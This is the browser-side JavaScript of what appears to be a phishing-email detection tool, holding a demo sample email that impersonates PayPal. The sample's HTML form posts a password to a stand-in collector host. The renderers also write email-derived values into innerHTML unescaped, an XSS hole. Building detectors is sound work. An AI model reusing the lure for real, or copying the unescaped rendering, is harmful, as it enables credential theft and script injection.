'use strict';

const SAMPLE_PHISHING = `From: "PayPal Security" <security@paypa1-alerts.tk>
Reply-To: collect@evil-domain.ml
To: victim@example.com
Subject: URGENT: Your PayPal account has been SUSPENDED!
Date: Thu, 29 May 2026 10:00:00 +0000
Received: from mail.evil.xyz (1.2.3.4) by mx.example.com; Thu, 29 May 2026 10:00:01 +0000
Authentication-Results: mx.example.com; spf=fail; dkim=none; dmarc=fail
Content-Type: text/html; charset=utf-8

<html><body>
<p>Dear Customer,</p>
<p>Your PayPal account has been SUSPENDED immediately! ACT NOW!</p>
<p><a href="http://1.2.3.4/paypal/verify">http://www.paypal.com/verify</a></p>
<form action="http://evil-domain.ml/collect"><input type="password" name="pw"></form>
<p>Failure to comply will result in legal action! Police have been notified!</p>
</body></html>`;

// Tab switching
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById(`tab-${tab.dataset.tab}`).classList.add('active');
  });
});

// File upload
const dropZone = document.getElementById('drop-zone');
const fileInput = document.getElementById('file-input');
const fileNameEl = document.getElementById('file-name');
let uploadedFile = null;

fileInput.addEventListener('change', e => {
  uploadedFile = e.target.files[0];
  fileNameEl.textContent = uploadedFile ? uploadedFile.name : '';
});
dropZone.addEventListener('click', () => fileInput.click());
dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('drag-over'); });
dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag-over'));
dropZone.addEventListener('drop', e => {
  e.preventDefault();
  dropZone.classList.remove('drag-over');
  uploadedFile = e.dataTransfer.files[0];
  fileNameEl.textContent = uploadedFile ? uploadedFile.name : '';
});

// Sample button
document.getElementById('sample-btn').addEventListener('click', () => {
  document.querySelector('.tab[data-tab="paste"]').click();
  document.getElementById('email-text').value = SAMPLE_PHISHING;
});

// Analyze
document.getElementById('analyze-btn').addEventListener('click', analyze);

async function analyze() {
  const btn = document.getElementById('analyze-btn');
  const activeTab = document.querySelector('.tab.active').dataset.tab;
  hideError();
  showLoading(true);
  btn.disabled = true;

  try {
    let response;
    if (activeTab === 'paste') {
      const raw = document.getElementById('email-text').value.trim();
      if (!raw) throw new Error('Please paste an email first.');
      response = await fetch('/api/v1/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ raw_email: raw, include_details: true }),
      });
    } else {
      if (!uploadedFile) throw new Error('Please select a .eml file first.');
      const formData = new FormData();
      formData.append('email_file', uploadedFile);
      response = await fetch('/api/v1/analyze/upload', { method: 'POST', body: formData });
    }

    if (!response.ok) {
      const err = await response.json().catch(() => ({}));
      throw new Error(err.detail || `Server error ${response.status}`);
    }

    const data = await response.json();
    renderResults(data);
  } catch (err) {
    showError(err.message);
  } finally {
    showLoading(false);
    btn.disabled = false;
  }
}

function renderResults(data) {
  document.getElementById('results').classList.remove('hidden');

  const banner = document.getElementById('verdict-banner');
  banner.className = `verdict-banner ${data.verdict}`;
  document.getElementById('verdict-icon').textContent = data.verdict === 'phishing' ? '⚠' : '✓';
  document.getElementById('verdict-text').textContent = data.verdict.toUpperCase();
  document.getElementById('confidence-value').textContent = `${Math.round(data.confidence * 100)}%`;

  const badge = document.getElementById('risk-badge');
  badge.textContent = data.risk_level.toUpperCase();
  badge.className = `risk-badge ${data.risk_level}`;

  document.getElementById('summary-text').textContent = data.summary;
  document.getElementById('timing').textContent = `Processed in ${data.processing_time_ms}ms`;

  if (data.feature_breakdown) {
    document.getElementById('breakdown').classList.remove('hidden');
    renderBreakdown(data.feature_breakdown);
  } else {
    document.getElementById('breakdown').classList.add('hidden');
  }

  document.getElementById('results').scrollIntoView({ behavior: 'smooth' });
}

function renderBreakdown(bd) {
  renderHeaderSection(bd.header_analysis);
  renderUrlSection(bd.url_analysis);
  renderBodySection(bd.body_analysis);
  renderStructuralSection(bd.structural_analysis);
  renderAuthSection(bd.auth_analysis);
  renderRiskFactors(bd.top_risk_factors);
}

function setFlagCount(id, count) {
  const el = document.getElementById(id);
  el.textContent = count === 0 ? '0 flags' : `${count} flag${count > 1 ? 's' : ''}`;
  el.className = `flag-count ${count > 0 ? 'has-flags' : ''}`;
}

function row(label, value) {
  return `<div class="detail-row"><span class="detail-label">${label}</span><span class="detail-value">${value ?? '—'}</span></div>`;
}

function flags(list) {
  return list.map(f => `<div class="flag-item">${f}</div>`).join('');
}

function bool(v) { return v ? 'Yes' : 'No'; }

function renderHeaderSection(h) {
  setFlagCount('header-flags', h.flags.length);
  document.getElementById('header-content').innerHTML = `
    ${row('Sender', h.sender_email)}
    ${row('Sender domain', h.sender_domain)}
    ${row('Reply-To domain', h.reply_to_domain)}
    ${row('From/Reply-To mismatch', bool(h.from_replyto_mismatch))}
    ${row('Display name mismatch', bool(h.display_name_email_mismatch))}
    ${row('Received headers', h.num_received_headers)}
    ${row('Suspicious routing', bool(h.suspicious_received_chain))}
    ${flags(h.flags)}
  `;
}

function renderUrlSection(u) {
  setFlagCount('url-flags', u.flagged_urls.length);
  const flaggedHtml = u.flagged_urls.map(f =>
    `<div class="flag-item">${f.url.substring(0, 60)}${f.url.length > 60 ? '…' : ''} — ${f.reason}</div>`
  ).join('');
  document.getElementById('url-content').innerHTML = `
    ${row('Total URLs', u.total_urls)}
    ${row('URLs with IP', u.urls_with_ip_address)}
    ${row('URL shorteners', u.url_shorteners_count)}
    ${row('Display/href mismatches', u.display_href_mismatches)}
    ${row('HTTPS ratio', `${Math.round(u.https_ratio * 100)}%`)}
    ${row('Longest URL', u.longest_url_length + ' chars')}
    ${flaggedHtml}
  `;
}

function renderBodySection(b) {
  setFlagCount('body-flags', b.flags.length);
  document.getElementById('body-content').innerHTML = `
    ${row('Body length', b.body_length + ' chars')}
    ${row('Urgency score', (b.urgency_score * 100).toFixed(2) + '%')}
    ${row('Credential request', bool(b.credential_request_detected))}
    ${row('HTML form', bool(b.contains_html_form))}
    ${row('Hidden text', bool(b.hidden_text_detected))}
    ${row('Grammar error estimate', (b.grammar_error_estimate * 100).toFixed(1) + '%')}
    ${flags(b.flags)}
  `;
}

function renderStructuralSection(s) {
  setFlagCount('structural-flags', s.flags.length);
  document.getElementById('structural-content').innerHTML = `
    ${row('Attachments', s.attachment_count)}
    ${row('Dangerous attachments', s.dangerous_attachment_types.join(', ') || 'None')}
    ${row('MIME depth', s.multipart_complexity)}
    ${row('Base64 parts', s.base64_encoded_parts)}
    ${row('Embedded images', bool(s.has_embedded_images))}
    ${flags(s.flags)}
  `;
}

function renderAuthSection(a) {
  setFlagCount('auth-flags', a.flags.length);
  function fmt(v) { return v === null ? 'Not available' : v ? 'Pass' : 'Fail'; }
  document.getElementById('auth-content').innerHTML = `
    ${row('SPF', fmt(a.spf_pass))}
    ${row('DKIM', fmt(a.dkim_pass))}
    ${row('DMARC', fmt(a.dmarc_pass))}
    ${row('Summary', a.auth_summary.replace('_', ' '))}
    ${flags(a.flags)}
  `;
}

function renderRiskFactors(factors) {
  const list = document.getElementById('risk-factors-list');
  if (!factors || !factors.length) { list.innerHTML = '<li>No significant risk factors.</li>'; return; }
  const maxContrib = Math.max(...factors.map(f => f.risk_contribution), 0.001);
  list.innerHTML = factors.map(f => {
    const pct = Math.round((f.risk_contribution / maxContrib) * 100);
    return `<li>
      <div class="risk-factor-name">${f.feature_name}</div>
      <div class="risk-factor-desc">${f.description} (value: ${f.value})</div>
      <div class="risk-factor-bar"><div class="risk-factor-fill" style="width:${pct}%"></div></div>
    </li>`;
  }).join('');
}

function showLoading(show) {
  document.getElementById('loading').classList.toggle('hidden', !show);
  if (show) document.getElementById('results').classList.add('hidden');
}

function showError(msg) {
  const el = document.getElementById('error-banner');
  el.textContent = `Error: ${msg}`;
  el.classList.remove('hidden');
}

function hideError() {
  document.getElementById('error-banner').classList.add('hidden');
}
